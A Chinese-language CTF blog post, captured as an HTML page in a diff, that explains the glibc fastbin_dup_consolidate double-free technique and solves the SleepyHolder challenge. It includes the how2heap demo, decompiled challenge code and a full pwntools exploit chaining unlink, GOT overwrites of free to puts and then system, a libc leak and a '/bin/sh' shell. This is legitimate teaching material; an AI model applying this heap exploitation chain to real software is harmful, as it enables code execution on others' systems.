@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>Introduction to pwn2.2-fastbin_dup_consolidate | Room of Equirement | pwn what you want</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="heap,pwn">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Sirius Whiter</h5>
+          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
+            
+              <span>x</span>
+            
+              <span>u</span>
+            
+              <span>e</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>e</span>
+            
+              <span>2</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>7</span>
+            
+              <span>@</span>
+            
+              <span>o</span>
+            
+              <span>u</span>
+            
+              <span>t</span>
+            
+              <span>l</span>
+            
+              <span>o</span>
+            
+              <span>o</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/siriuswhiter" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/siriuswhiter" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        
+	
+<header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Introduction to pwn2.2-fastbin_dup_consolidate</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Introduction to pwn2.2-fastbin_dup_consolidate</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-10-18T08:43:27.000Z" itemprop="datePublished" class="page-time">
+  2018-10-18
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+
+
+<div class="container body-wrap">
+    <article id="post-introduction-to-pwn2-2-fastbin-dup-consolidate"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Introduction to pwn2.2-fastbin_dup_consolidate</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-10-18 16:43:27" datetime="2018-10-18T08:43:27.000Z"  itemprop="datePublished">2018-10-18</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>比较神奇的一个利用。<br>pwntools —&gt;  cyclic   cyclic_find<br>i locals</p>
+<h1 id="fastbin-dup-consolidate原理"><a href="#fastbin-dup-consolidate原理" class="headerlink" title="fastbin_dup_consolidate原理"></a>fastbin_dup_consolidate原理</h1><p>  当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate<br>这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。</p>
+<p>继续使用how2heap的例子来理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260</span><br></pre></td></tr></table></figure>
+<h1 id="例题-SleepyHolder"><a href="#例题-SleepyHolder" class="headerlink" title="例题 SleepyHolder"></a>例题 SleepyHolder</h1><p><em>简单程度和uaf相当hhhh</em></p>
+<p>main</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int buf; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  alarm0x3c();                                  // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Waking Sleepy Holder up ...&quot;);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 4uLL);</span><br><span class="line">  buf &amp;= 0xFFFu;</span><br><span class="line">  malloc(buf);                                  // malloc something random to change heap_address every time</span><br><span class="line">                                                // </span><br><span class="line">  sleep(3u);</span><br><span class="line">  puts(&quot;Hey! Do you have any secret?&quot;);</span><br><span class="line">  puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1. Keep secret&quot;);</span><br><span class="line">    puts(&quot;2. Wipe secret&quot;);</span><br><span class="line">    puts(&quot;3. Renew secret&quot;);</span><br><span class="line">    memset(&amp;s, 0, 4uLL);</span><br><span class="line">    read(0, &amp;s, 4uLL);</span><br><span class="line">    v3 = atoi(&amp;s);</span><br><span class="line">    v6 = v3;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        wipe_secret();     //仅仅把free掉并把该chunk的inuse位标记为0</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        renew_secret();    //重新改写1或者2的chunk，大小最大还是原来那么大。</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        keep_serect();    //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1.</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>假设三个chunk分别为chunk0,1,2;</p>
+<ol>
+<li>首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1.</li>
+<li>之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。</li>
+<li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。</li>
+<li>算出system的地址，并将其写入free_got，调用free便可以getshell。</li>
+</ol>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">p = process(&apos;./SleepyHolder&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./SleepyHolder&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)     //ldd ./SleepyHolder</span><br><span class="line"></span><br><span class="line">def add(index, content):</span><br><span class="line">	p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;\n&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line">def delete(index):</span><br><span class="line">	p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">	p.send(str(index))</span><br><span class="line"></span><br><span class="line">def update(index, content):</span><br><span class="line">	p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">#分配chunk1 chunk2</span><br><span class="line">add(1, &apos;a&apos;*0x10)</span><br><span class="line">add(2, &apos;b&apos;*0x10)</span><br><span class="line">#释放chunk1</span><br><span class="line">delete(1)</span><br><span class="line">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span><br><span class="line">add(3, &apos;c&apos;*0x10)</span><br><span class="line">#这时再释放chunk1，让chunk1重新进入fast bin</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">heap_ptr = 0x6020d0 #堆指针</span><br><span class="line">#准备unlink，在chunk1中伪造chunk</span><br><span class="line">payload = p64(0) + p64(0x21)</span><br><span class="line">payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)</span><br><span class="line">payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size</span><br><span class="line">add(1, payload)</span><br><span class="line">#此时chunk2的inuse位是0，所以触发unlink</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br><span class="line">atoi_off = libc.symbols[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span><br><span class="line">#将chunk2指针覆盖为atoi_got</span><br><span class="line">#将chunk3指针覆盖为puts_got</span><br><span class="line">#将chunk1指针覆盖为free_got</span><br><span class="line">payload = p64(0) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(1, payload)</span><br><span class="line">#再次向chunk1写入，相当于向free_got写入</span><br><span class="line">#这里将free_got写为puts</span><br><span class="line">update(1, p64(puts))</span><br><span class="line"></span><br><span class="line">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span><br><span class="line">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span><br><span class="line">#由此可计算出libc_base</span><br><span class="line">delete(2)</span><br><span class="line">libc_base = u64(p.recv(6) + &apos;\x00\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节</span><br><span class="line">print &quot;libc_base : %#x&quot; % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">#将free的got表写为system</span><br><span class="line">update(1, p64(system))</span><br><span class="line">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span><br><span class="line">add(2, &apos;/bin/sh\x00&apos;)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-10-20T03:39:45.388Z" itemprop="dateUpdated">2018-10-20 11:39:45</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/" target="_blank" rel="external">http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/</a>
+        
+    </div>
+    <footer>
+        <a href="http://siriuswhiter.tk">
+            <img src="/img/avatar.jpg" alt="Sirius Whiter">
+            Sirius Whiter
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/&title=《Introduction to pwn2.2-fastbin_dup_consolidate》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/&title=《Introduction to pwn2.2-fastbin_dup_consolidate》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2018/10/27/diary-20181027/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">diary-20181027</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2018/10/15/introduction-to-pwn2-1-fastbin-dup/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Introduction to pwn2.1-fastbin_dup</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#fastbin-dup-consolidate原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">fastbin_dup_consolidate原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#例题-SleepyHolder"><span class="post-toc-number">2.</span> <span class="post-toc-text">例题 SleepyHolder</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#思路"><span class="post-toc-number">3.</span> <span class="post-toc-text">思路</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp"><span class="post-toc-number">4.</span> <span class="post-toc-text">exp</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+</div>
+
+        <footer class="footer">
+    
+    <div class="top">
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Sirius Whiter &copy; 2018 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/&title=《Introduction to pwn2.2-fastbin_dup_consolidate》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/&title=《Introduction to pwn2.2-fastbin_dup_consolidate》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrUlEQVR42u3aO3LDMAwFQN//0kqbmYypBxBUVCwrj63fqiBgAJ9PvK5fa33MZ2P9vsLfO+5fHw8PD2+Kdy3Xt2PWD/T3UZLvk7vnZ+Hh4eGd5iXb9PrS1UfJf11/vrHg4eHhvYY3lS7fbOvF9BoPDw/vzby8MPEtja6ei4eHh/c2Xp7ars+dTcEfrbXg4eHh1bLWckL8v5+P9Pfw8PDwtrvq1TJBnppXE+6rtfDw8PBO8PINd6fdtVPGrabLeHh4eE/y8tuPlQC2w8b6peDh4eGd41UfIm9i7ZRoq7WFsVoLHh4e3pK3TmGrm2xCqj56r0KLh4eHd4538zc+HszqbffVYsRA0oyHh4c3xJsqRuQDWztNtXI5GA8PD+8Ar1oe7aW/eYDpRbab4/Hw8PBGeXlgSB63lzrvJ+J4eHh4z/Dy2+TpbLXwuh/TvoY0PDw8vGO8agm1uolXm23VEPX1vnh4eHgHeHlrvxc88uMPtsHw8PDwHhwg2AkbvWOqgaF6Lzw8PLwpXi/ZrW7NvRdUXV8nI/Dw8PBGedUTpkoM1RJGch08PDy8Z3i9TX+nzd+ccQiKHQNVEzw8PLzl9/lYVXWMYKfYegWr8F8BDw8Pb5SXJLXVtDj/3GMnSTkeHh7eaV4vSOSPOztM0BvDwsPDw5vlVTfZaoKbv7hew+wmzODh4eE9yMuLC3mbKg8V1aEEPDw8vPfwcsBsuytH3gQ2PDw8vFHeVVx5Sbf6Ta8McQPGw8PDO8DbaedPjQLst9wGFh4eHl6R1yu59kJFNST0RrsKiTUeHh7eBq/XGEsedGxwqjiYhYeHh/c2Xl4UyAsHO2EgaoDh4eHh/RMvb2Il4DzVXh+Ph4eH9zxvp+mVl1/z8DA2qoWHh4d3gNf7k79T2N15ZcOdPTw8PLwa7wdhLMU6eMQwhwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
